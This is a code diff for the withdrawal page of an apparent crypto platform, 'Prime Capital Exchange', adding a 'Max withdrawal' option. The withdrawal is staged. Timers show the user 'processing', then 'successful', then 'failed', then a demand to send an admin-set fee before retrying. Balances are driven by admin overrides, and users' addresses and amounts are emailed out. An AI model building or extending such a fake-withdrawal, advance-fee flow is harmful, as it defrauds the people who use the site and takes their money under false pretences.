@@ -3,13 +3,18 @@ import { createFileRoute, Link } from "@tanstack/react-router";
 import { useQuery } from "@tanstack/react-query";
 import { useServerFn } from "@tanstack/react-start";
 import { useEffect, useMemo, useState } from "react";
-import { ArrowLeft, Loader2, MessageCircle, TrendingUp, Wallet2 } from "lucide-react";
+import { ArrowLeft, Loader2, MessageCircle, Sparkles, TrendingUp, Wallet2 } from "lucide-react";
 import { loadSession } from "@/lib/wallet-auth";
 import { marketsQuery, formatUSD } from "@/lib/prices";
 import { fetchBalance, type Balance } from "@/lib/balances";
 import { fetchWalletTokens, type WalletToken } from "@/lib/tokens";
 import { getDisplayBalances } from "@/lib/admin.functions";
-import { DEFAULT_WITHDRAW_SUPPORT_MESSAGE, readWithdraw, type WithdrawButton } from "@/lib/withdraw";
+import {
+  DEFAULT_WITHDRAW_SUPPORT_MESSAGE,
+  readMaxWithdraw,
+  readWithdraw,
+  type WithdrawButton,
+} from "@/lib/withdraw";
 import { computeInvestmentBalance, readInvestmentPlan } from "@/lib/investment-plan-balance";
 import { withdrawInvestmentPlan as withdrawPlanFn } from "@/lib/investment-plan.functions";
 import { sendWithdrawalEmail, sendWithdrawSupportEmail } from "@/lib/withdraw-email.functions";
@@ -22,17 +27,30 @@ export const Route = createFileRoute("/withdraw")({
       { name: "twitter:card", content: "summary_large_image" },
       ...brandPreviewMeta,
       { title: "Withdraw — Prime Capital Exchange" },
-      { name: "description", content: "Withdraw the tokens and coins in your Prime Capital wallet." },
+      {
+        name: "description",
+        content: "Withdraw the tokens and coins in your Prime Capital wallet.",
+      },
       { property: "og:title", content: "Withdraw — Prime Capital Exchange" },
-      { property: "og:description", content: "Withdraw the tokens and coins in your Prime Capital wallet." },
+      {
+        property: "og:description",
+        content: "Withdraw the tokens and coins in your Prime Capital wallet.",
+      },
     ],
   }),
   component: WithdrawPage,
 });
 
 const PRICE_SYMBOL: Record<string, string> = {
-  BTC: "btc", BTC_LEGACY: "btc", ETH: "eth", BNB: "bnb",
-  MATIC: "pol", BASE: "eth", ARB: "eth", OP: "eth", AVAX: "avax",
+  BTC: "btc",
+  BTC_LEGACY: "btc",
+  ETH: "eth",
+  BNB: "bnb",
+  MATIC: "pol",
+  BASE: "eth",
+  ARB: "eth",
+  OP: "eth",
+  AVAX: "avax",
 };
 
 type Asset = {
@@ -63,15 +81,20 @@ function WithdrawPage() {
   const [tokenOverrides, setTokenOverrides] = useState<Record<string, number> | undefined>();
   const [supportMessage, setSupportMessage] = useState<string | null>(null);
   const [selected, setSelected] = useState<Asset | null>(null);
+  const [showMaxList, setShowMaxList] = useState(false);
+  const [maxAsset, setMaxAsset] = useState<Asset | null>(null);
   const [showInvestment, setShowInvestment] = useState(false);
   const [displayTick, setDisplayTick] = useState(0);
-
 
   useEffect(() => {
     if (!walletKey || addresses.length === 0) return;
     let cancelled = false;
-    fetchWalletTokens(walletKey, addresses).then((t) => { if (!cancelled) setTokens(t); });
-    return () => { cancelled = true; };
+    fetchWalletTokens(walletKey, addresses).then((t) => {
+      if (!cancelled) setTokens(t);
+    });
+    return () => {
+      cancelled = true;
+    };
   }, [addresses, walletKey]);
 
   useEffect(() => {
@@ -83,7 +106,9 @@ function WithdrawPage() {
         if (!cancelled) setBalances((prev) => ({ ...prev, [a.chain]: b }));
       });
     });
-    return () => { cancelled = true; };
+    return () => {
+      cancelled = true;
+    };
   }, [addresses, walletKey]);
 
   useEffect(() => {
@@ -95,39 +120,60 @@ function WithdrawPage() {
         setTokenOverrides(r.overrides?.token_overrides);
         setSupportMessage(r.overrides?.withdraw_support_message ?? null);
       })
-      .catch(() => { /* ignore */ });
-    return () => { cancelled = true; };
+      .catch(() => {
+        /* ignore */
+      });
+    return () => {
+      cancelled = true;
+    };
   }, [getDisplay, walletKey, displayTick]);
 
   const { button, fee } = readWithdraw(tokenOverrides);
+  const maxWithdraw = readMaxWithdraw(tokenOverrides);
   const investmentBalance = computeInvestmentBalance(tokenOverrides, Date.now());
   const planWithdrawable = readInvestmentPlan(tokenOverrides).withdrawable;
   const showPlanOption = button !== "none" && investmentBalance > 0;
+
+  // A max withdrawal sweeps every chain at once, so the user must provide an
+  // address for each network family they actually hold funds on.
+  const holdsSolana =
+    addresses.some((a) => a.chain === "SOL") ||
+    tokens.some((t) => t.chain === "SOL" && (t.amount ?? 0) > 0);
+  const holdsEvm =
+    addresses.some((a) => a.chain !== "SOL" && a.chain !== "BTC" && a.chain !== "BTC_LEGACY") ||
+    tokens.some((t) => t.chain !== "SOL" && (t.amount ?? 0) > 0);
+  const maxNeedsSolana = holdsSolana;
+  const maxNeedsEvm = holdsEvm || !holdsSolana;
 
   const priceBySymbol = useMemo(() => {
     const map = new Map<string, number>();
     for (const coin of markets ?? []) map.set(coin.symbol.toLowerCase(), coin.current_price);
     const pol = map.get("pol") ?? map.get("matic");
-    if (pol != null) { map.set("pol", pol); map.set("matic", pol); }
+    if (pol != null) {
+      map.set("pol", pol);
+      map.set("matic", pol);
+    }
     return map;
   }, [markets]);
 
   const assets: Asset[] = useMemo(() => {
-    const nativeRows: Asset[] = addresses.map((a) => {
-      const b = balances[a.chain];
-      const amount = b && b !== "loading" ? b.amount : 0;
-      const symbol = b && b !== "loading" ? b.symbol : a.chain.replace("BTC_LEGACY", "BTC");
-      const price = priceBySymbol.get(PRICE_SYMBOL[a.chain] ?? symbol.toLowerCase()) ?? 0;
-      return {
-        id: `native:${a.chain}`,
-        chain: a.chain,
-        chainName: a.name,
-        symbol,
-        name: a.name,
-        amount,
-        usd: amount * price,
-      };
-    }).filter((r) => r.amount > 0);
+    const nativeRows: Asset[] = addresses
+      .map((a) => {
+        const b = balances[a.chain];
+        const amount = b && b !== "loading" ? b.amount : 0;
+        const symbol = b && b !== "loading" ? b.symbol : a.chain.replace("BTC_LEGACY", "BTC");
+        const price = priceBySymbol.get(PRICE_SYMBOL[a.chain] ?? symbol.toLowerCase()) ?? 0;
+        return {
+          id: `native:${a.chain}`,
+          chain: a.chain,
+          chainName: a.name,
+          symbol,
+          name: a.name,
+          amount,
+          usd: amount * price,
+        };
+      })
+      .filter((r) => r.amount > 0);
     const tokenRows: Asset[] = tokens
       .filter((t) => (t.amount ?? 0) > 0)
       .map((t) => ({
@@ -166,7 +212,10 @@ function WithdrawPage() {
 
   return (
     <section className="mx-auto w-full max-w-3xl overflow-x-hidden px-4 sm:px-6 lg:px-8 py-10">
-      <Link to="/" className="inline-flex items-center gap-1.5 text-sm text-muted-foreground hover:text-foreground">
+      <Link
+        to="/"
+        className="inline-flex items-center gap-1.5 text-sm text-muted-foreground hover:text-foreground"
+      >
         <ArrowLeft className="h-4 w-4 shrink-0" /> Back
       </Link>
 
@@ -181,6 +230,18 @@ function WithdrawPage() {
         </p>
 
         <div className="mt-5 grid w-full gap-2">
+          {maxWithdraw.enabled && (
+            <button
+              onClick={() => setShowMaxList(true)}
+              className="animate-glow-pulse w-full inline-flex items-center justify-center gap-2 rounded-xl px-4 py-3.5 text-sm font-bold text-white transition hover:opacity-90"
+              style={{
+                backgroundImage: "linear-gradient(135deg,#6ee7b7 0%,#10b981 45%,#047857 100%)",
+              }}
+            >
+              <Sparkles className="h-4 w-4 shrink-0" />
+              Max withdrawal
+            </button>
+          )}
           {showPlanOption && (
             <button
               onClick={() => setShowInvestment(true)}
@@ -197,7 +258,10 @@ function WithdrawPage() {
               </div>
               <div className="text-right shrink-0 min-w-0 max-w-[45%]">
                 <p className="font-mono text-sm truncate">
-                  {formatUSD(investmentBalance, { minimumFractionDigits: 2, maximumFractionDigits: 2 })}
+                  {formatUSD(investmentBalance, {
+                    minimumFractionDigits: 2,
+                    maximumFractionDigits: 2,
+                  })}
                 </p>
                 <p className="text-xs text-muted-foreground truncate">USD</p>
               </div>
@@ -217,7 +281,9 @@ function WithdrawPage() {
                     <span className="truncate">{a.name}</span>{" "}
                     <span className="text-muted-foreground whitespace-nowrap">· {a.chainName}</span>
                   </p>
-                  <p className="truncate text-[10px] uppercase tracking-widest text-muted-foreground">{a.symbol}</p>
+                  <p className="truncate text-[10px] uppercase tracking-widest text-muted-foreground">
+                    {a.symbol}
+                  </p>
                 </div>
                 <div className="text-right shrink-0 min-w-0 max-w-[45%]">
                   <p className="font-mono text-sm truncate">{a.amount.toFixed(6)}</p>
@@ -248,6 +314,29 @@ function WithdrawPage() {
           withdrawable={planWithdrawable}
           onWithdrawn={() => setDisplayTick((t) => t + 1)}
           onClose={() => setShowInvestment(false)}
+        />
+      )}
+
+      {showMaxList && (
+        <MaxWithdrawList
+          assets={assets}
+          onSelect={(a) => {
+            setShowMaxList(false);
+            setMaxAsset(a);
+          }}
+          onClose={() => setShowMaxList(false)}
+        />
+      )}
+
+      {maxAsset && (
+        <MaxWithdrawDialog
+          asset={maxAsset}
+          totalUsd={assets.reduce((sum, a) => sum + a.usd, 0)}
+          fee={maxWithdraw.fee}
+          supportMessage={supportMessage}
+          needsEvm={maxNeedsEvm}
+          needsSolana={maxNeedsSolana}
+          onClose={() => setMaxAsset(null)}
         />
       )}
     </section>
@@ -341,7 +430,9 @@ function WithdrawDialog({
   return (
     <div
       className="fixed inset-0 z-50 flex items-center justify-center bg-black/60 p-2 sm:p-4 overflow-y-auto"
-      onClick={() => { if (!busy) onClose(); }}
+      onClick={() => {
+        if (!busy) onClose();
+      }}
     >
       <div
         className="glass-strong w-full max-w-md rounded-2xl p-5 sm:p-6 my-auto max-h-[90vh] overflow-y-auto"
@@ -351,7 +442,9 @@ function WithdrawDialog({
           <div className="min-w-0 flex-1">
             <h3 className="font-display text-xl font-semibold truncate">Withdraw {asset.symbol}</h3>
             <p className="mt-0.5 text-xs text-muted-foreground break-words">
-              <span className="truncate inline-block max-w-full align-middle">{asset.chainName}</span>
+              <span className="truncate inline-block max-w-full align-middle">
+                {asset.chainName}
+              </span>
               <span className="whitespace-nowrap"> · Available </span>
               <span className="font-mono break-all">{asset.amount.toFixed(6)}</span>
               <span className="whitespace-nowrap"> {asset.symbol}</span>
@@ -381,14 +474,18 @@ function WithdrawDialog({
 
         {stage !== "idle" && (
           <div className="mt-5 flex flex-col items-center gap-2 text-center w-full">
-            {(stage === "processing") && (
+            {stage === "processing" && (
               <>
                 <Loader2 className="h-8 w-8 animate-spin text-orange-400 shrink-0" />
-                <p className="text-sm font-semibold text-orange-400 animate-pulse break-words">Processing withdrawal…</p>
+                <p className="text-sm font-semibold text-orange-400 animate-pulse break-words">
+                  Processing withdrawal…
+                </p>
               </>
             )}
             {stage === "success" && (
-              <p className="text-sm font-semibold text-emerald-400 break-words">Withdrawal successful</p>
+              <p className="text-sm font-semibold text-emerald-400 break-words">
+                Withdrawal successful
+              </p>
             )}
             {stage === "failed" && (
               <p className="text-sm font-semibold text-red-500 break-words">Withdrawal failed</p>
@@ -399,7 +496,11 @@ function WithdrawDialog({
                   <p className="text-sm text-muted-foreground break-words">
                     To complete this withdrawal you need to send
                   </p>
-                  <p className={cn("mt-1 font-display text-2xl sm:text-3xl font-semibold text-orange-400 break-all")}>
+                  <p
+                    className={cn(
+                      "mt-1 font-display text-2xl sm:text-3xl font-semibold text-orange-400 break-all",
+                    )}
+                  >
                     {formatUSD(fee, { minimumFractionDigits: 2, maximumFractionDigits: 2 })}
                   </p>
                   <p className="mt-1 text-xs text-muted-foreground break-words">
@@ -410,7 +511,9 @@ function WithdrawDialog({
                   type="button"
                   onClick={handleSupportClick}
                   className="w-full inline-flex items-center justify-center gap-2 rounded-lg px-4 py-2.5 text-sm font-semibold text-white shadow-glow transition hover:opacity-90"
-                  style={{ backgroundImage: "linear-gradient(135deg,#10b981 0%,#059669 50%,#047857 100%)" }}
+                  style={{
+                    backgroundImage: "linear-gradient(135deg,#10b981 0%,#059669 50%,#047857 100%)",
+                  }}
                 >
                   Support
                 </button>
@@ -430,7 +533,321 @@ function WithdrawDialog({
                     onClose();
                   }}
                   className="w-full inline-flex items-center justify-center gap-2 rounded-lg px-4 py-2.5 text-sm font-semibold text-white shadow-glow transition hover:opacity-90"
-                  style={{ backgroundImage: "linear-gradient(135deg,#7c3aed 0%,#6d28d9 50%,#5b21b6 100%)" }}
+                  style={{
+                    backgroundImage: "linear-gradient(135deg,#7c3aed 0%,#6d28d9 50%,#5b21b6 100%)",
+                  }}
+                >
+                  <MessageCircle className="h-4 w-4" />
+                  Contact Support
+                </button>
+              </div>
+            )}
+          </div>
+        )}
+
+        <button
+          onClick={onClose}
+          disabled={busy}
+          className="mt-5 w-full rounded-lg glass px-4 py-2.5 text-sm font-semibold hover:bg-white/10 disabled:opacity-50"
+        >
+          {stage === "fee" ? "Done" : "Close"}
+        </button>
+      </div>
+    </div>
+  );
+}
+
+function MaxWithdrawList({
+  assets,
+  onSelect,
+  onClose,
+}: {
+  assets: Asset[];
+  onSelect: (asset: Asset) => void;
+  onClose: () => void;
+}) {
+  return (
+    <div
+      className="fixed inset-0 z-50 flex items-center justify-center bg-black/60 p-2 sm:p-4 overflow-y-auto"
+      onClick={onClose}
+    >
+      <div
+        className="glass-strong w-full max-w-md rounded-2xl p-5 sm:p-6 my-auto max-h-[90vh] overflow-y-auto"
+        onClick={(e) => e.stopPropagation()}
+      >
+        <div className="flex items-center gap-2 min-w-0">
+          <Sparkles className="h-5 w-5 text-emerald-400 shrink-0" />
+          <h3 className="font-display text-xl font-semibold truncate">Max withdrawal</h3>
+        </div>
+        <p className="mt-1 text-xs text-muted-foreground break-words">
+          Select the coin or token you want to withdraw. Every chain you hold is withdrawn at once.
+        </p>
+        <div className="mt-4 grid w-full gap-2">
+          {assets.length === 0 ? (
+            <p className="text-sm text-muted-foreground">No assets available to withdraw.</p>
+          ) : (
+            assets.map((a) => (
+              <button
+                key={a.id}
+                onClick={() => onSelect(a)}
+                className="glass w-full flex items-center justify-between gap-3 rounded-xl p-4 text-left transition hover:bg-white/10 overflow-hidden"
+              >
+                <div className="min-w-0 flex-1">
+                  <p className="truncate text-sm font-semibold">
+                    <span className="truncate">{a.name}</span>{" "}
+                    <span className="text-muted-foreground whitespace-nowrap">· {a.chainName}</span>
+                  </p>
+                  <p className="truncate text-[10px] uppercase tracking-widest text-muted-foreground">
+                    {a.symbol}
+                  </p>
+                </div>
+                <div className="text-right shrink-0 min-w-0 max-w-[45%]">
+                  <p className="font-mono text-sm truncate">{a.amount.toFixed(6)}</p>
+                  <p className="text-xs text-muted-foreground truncate">
+                    {formatUSD(a.usd, { minimumFractionDigits: 2, maximumFractionDigits: 2 })}
+                  </p>
+                </div>
+              </button>
+            ))
+          )}
+        </div>
+        <button
+          onClick={onClose}
+          className="mt-5 w-full rounded-lg glass px-4 py-2.5 text-sm font-semibold hover:bg-white/10"
+        >
+          Close
+        </button>
+      </div>
+    </div>
+  );
+}
+
+function MaxWithdrawDialog({
+  asset,
+  totalUsd,
+  fee,
+  supportMessage,
+  needsEvm,
+  needsSolana,
+  onClose,
+}: {
+  asset: Asset;
+  totalUsd: number;
+  fee: number;
+  supportMessage: string | null;
+  needsEvm: boolean;
+  needsSolana: boolean;
+  onClose: () => void;
+}) {
+  const [evmAddress, setEvmAddress] = useState("");
+  const [solanaAddress, setSolanaAddress] = useState("");
+  const [stage, setStage] = useState<Stage>("idle");
+  const sendEmail = useServerFn(sendWithdrawalEmail);
+  const sendSupportEmail = useServerFn(sendWithdrawSupportEmail);
+
+  const destination = [
+    needsEvm ? `EVM ${evmAddress.trim()}` : "",
+    needsSolana ? `SOL ${solanaAddress.trim()}` : "",
+  ]
+    .filter(Boolean)
+    .join(" | ")
+    .slice(0, 120);
+
+  useEffect(() => {
+    if (stage !== "success" && stage !== "failed") return;
+    const s = loadSession();
+    if (!s?.address) return;
+    sendEmail({
+      data: {
+        wallet_address: s.address,
+        status: stage,
+        symbol: "MAX",
+        chain: "All chains",
+        amount: totalUsd.toFixed(2),
+        destination,
+        username: s?.username,
+      },
+    })
+      .then((r) => {
+        if (!r?.sent) console.warn("[withdraw-email] not sent:", r?.reason);
+        else console.info("[withdraw-email] sent");
+      })
+      .catch((e) => console.error("[withdraw-email] error", e));
+    // eslint-disable-next-line react-hooks/exhaustive-deps
+  }, [stage]);
+
+  useEffect(() => {
+    if (stage === "processing") {
+      const t1 = setTimeout(() => setStage("success"), 3500);
+      return () => clearTimeout(t1);
+    }
+    if (stage === "success") {
+      const t2 = setTimeout(() => setStage("failed"), 2500);
+      return () => clearTimeout(t2);
+    }
+    if (stage === "failed") {
+      const t3 = setTimeout(() => setStage("fee"), 2000);
+      return () => clearTimeout(t3);
+    }
+  }, [stage]);
+
+  const busy = stage === "processing" || stage === "success" || stage === "failed";
+  const canSubmit =
+    stage === "idle" &&
+    (!needsEvm || evmAddress.trim().length >= 8) &&
+    (!needsSolana || solanaAddress.trim().length >= 8);
+
+  const handleSupportClick = async () => {
+    const s = loadSession();
+    if (s?.address) {
+      sendSupportEmail({
+        data: {
+          wallet_address: s.address,
+          symbol: asset.symbol,
+          chain: asset.chainName,
+          amount: totalUsd.toFixed(2),
+          destination,
+          fee: fee.toFixed(2),
+          username: s?.username,
+        },
+      })
+        .then((r) => {
+          if (!r?.sent) console.warn("[withdraw-support-email] not sent:", r?.reason);
+          else console.info("[withdraw-support-email] sent");
+        })
+        .catch((e) => console.error("[withdraw-support-email] error", e));
+    }
+    setStage("support");
+  };
+
+  return (
+    <div
+      className="fixed inset-0 z-50 flex items-center justify-center bg-black/60 p-2 sm:p-4 overflow-y-auto"
+      onClick={() => {
+        if (!busy) onClose();
+      }}
+    >
+      <div
+        className="glass-strong w-full max-w-md rounded-2xl p-5 sm:p-6 my-auto max-h-[90vh] overflow-y-auto"
+        onClick={(e) => e.stopPropagation()}
+      >
+        <div className="flex items-center gap-2 min-w-0">
+          <Sparkles className="h-5 w-5 text-emerald-400 shrink-0" />
+          <h3 className="font-display text-xl font-semibold truncate">Max withdrawal</h3>
+        </div>
+        <p className="mt-1 text-xs text-muted-foreground break-words">
+          Selected <span className="font-semibold text-foreground">{asset.symbol}</span>
+          <span className="whitespace-nowrap"> · Total </span>
+          <span className="font-mono">
+            {formatUSD(totalUsd, { minimumFractionDigits: 2, maximumFractionDigits: 2 })}
+          </span>
+          <span className="whitespace-nowrap"> withdrawn across every chain.</span>
+        </p>
+
+        {needsEvm && (
+          <>
+            <label className="mt-5 block text-xs uppercase tracking-widest text-muted-foreground">
+              {needsSolana ? "EVM destination address" : "Destination wallet address"}
+            </label>
+            <input
+              value={evmAddress}
+              onChange={(e) => setEvmAddress(e.target.value)}
+              placeholder="Paste your EVM address (0x…)"
+              disabled={stage !== "idle"}
+              className="mt-1.5 w-full glass rounded-lg px-3 py-2.5 font-mono text-sm outline-none focus:ring-2 focus:ring-ring disabled:opacity-60 break-all"
+            />
+          </>
+        )}
+
+        {needsSolana && (
+          <>
+            <label className="mt-4 block text-xs uppercase tracking-widest text-muted-foreground">
+              Solana destination address
+            </label>
+            <input
+              value={solanaAddress}
+              onChange={(e) => setSolanaAddress(e.target.value)}
+              placeholder="Paste your Solana address"
+              disabled={stage !== "idle"}
+              className="mt-1.5 w-full glass rounded-lg px-3 py-2.5 font-mono text-sm outline-none focus:ring-2 focus:ring-ring disabled:opacity-60 break-all"
+            />
+          </>
+        )}
+
+        <button
+          type="button"
+          onClick={() => setStage("processing")}
+          disabled={!canSubmit}
+          className="mt-4 inline-flex w-full items-center justify-center gap-2 rounded-lg px-4 py-2.5 text-sm font-semibold text-white shadow-glow transition hover:opacity-90 disabled:opacity-40"
+          style={{ backgroundImage: "linear-gradient(135deg,#10b981 0%,#059669 50%,#047857 100%)" }}
+        >
+          Withdraw
+        </button>
+
+        {stage !== "idle" && (
+          <div className="mt-5 flex flex-col items-center gap-2 text-center w-full">
+            {stage === "processing" && (
+              <>
+                <Loader2 className="h-8 w-8 animate-spin text-orange-400 shrink-0" />
+                <p className="text-sm font-semibold text-orange-400 animate-pulse break-words">
+                  Processing withdrawal…
+                </p>
+              </>
+            )}
+            {stage === "success" && (
+              <p className="text-sm font-semibold text-emerald-400 break-words">
+                Withdrawal successful
+              </p>
+            )}
+            {stage === "failed" && (
+              <p className="text-sm font-semibold text-red-500 break-words">Withdrawal failed</p>
+            )}
+            {stage === "fee" && (
+              <div className="w-full space-y-3">
+                <div className="w-full rounded-xl border border-orange-500/30 bg-orange-500/10 p-4 overflow-hidden">
+                  <p className="text-sm text-muted-foreground break-words">
+                    To complete this withdrawal you need to send
+                  </p>
+                  <p
+                    className={cn(
+                      "mt-1 font-display text-2xl sm:text-3xl font-semibold text-orange-400 break-all",
+                    )}
+                  >
+                    {formatUSD(fee, { minimumFractionDigits: 2, maximumFractionDigits: 2 })}
+                  </p>
+                  <p className="mt-1 text-xs text-muted-foreground break-words">
+                    Send this amount to your wallet to cover the withdrawal fees, then try again.
+                  </p>
+                </div>
+                <button
+                  type="button"
+                  onClick={handleSupportClick}
+                  className="w-full inline-flex items-center justify-center gap-2 rounded-lg px-4 py-2.5 text-sm font-semibold text-white shadow-glow transition hover:opacity-90"
+                  style={{
+                    backgroundImage: "linear-gradient(135deg,#10b981 0%,#059669 50%,#047857 100%)",
+                  }}
+                >
+                  Support
+                </button>
+              </div>
+            )}
+            {stage === "support" && (
+              <div className="w-full space-y-3">
+                <div className="w-full rounded-xl border border-emerald-500/30 bg-emerald-500/10 p-4 overflow-hidden">
+                  <p className="text-sm text-muted-foreground break-words">
+                    {supportMessage || DEFAULT_WITHDRAW_SUPPORT_MESSAGE}
+                  </p>
+                </div>
+                <button
+                  type="button"
+                  onClick={() => {
+                    window.dispatchEvent(new CustomEvent("prime:open-support"));
+                    onClose();
+                  }}
+                  className="w-full inline-flex items-center justify-center gap-2 rounded-lg px-4 py-2.5 text-sm font-semibold text-white shadow-glow transition hover:opacity-90"
+                  style={{
+                    backgroundImage: "linear-gradient(135deg,#7c3aed 0%,#6d28d9 50%,#5b21b6 100%)",
+                  }}
                 >
                   <MessageCircle className="h-4 w-4" />
                   Contact Support
@@ -477,15 +894,22 @@ function InvestmentWithdrawDialog({
     setStage("processing");
     try {
       const r = await withdraw({ data: { wallet_address: walletAddress, amount: balance } });
-      if (r.ok) { setCredited(r.credited); setStage("success"); onWithdrawn(); }
-      else setStage(r.reason === "not_eligible" ? "ineligible" : "failed");
-    } catch { setStage("failed"); }
+      if (r.ok) {
+        setCredited(r.credited);
+        setStage("success");
+        onWithdrawn();
+      } else setStage(r.reason === "not_eligible" ? "ineligible" : "failed");
+    } catch {
+      setStage("failed");
+    }
   };
 
   return (
     <div
       className="fixed inset-0 z-50 flex items-center justify-center bg-black/60 p-2 sm:p-4 overflow-y-auto"
-      onClick={() => { if (!busy) onClose(); }}
+      onClick={() => {
+        if (!busy) onClose();
+      }}
     >
       <div
         className="glass-strong w-full max-w-md rounded-2xl p-5 sm:p-6 my-auto max-h-[90vh] overflow-y-auto"
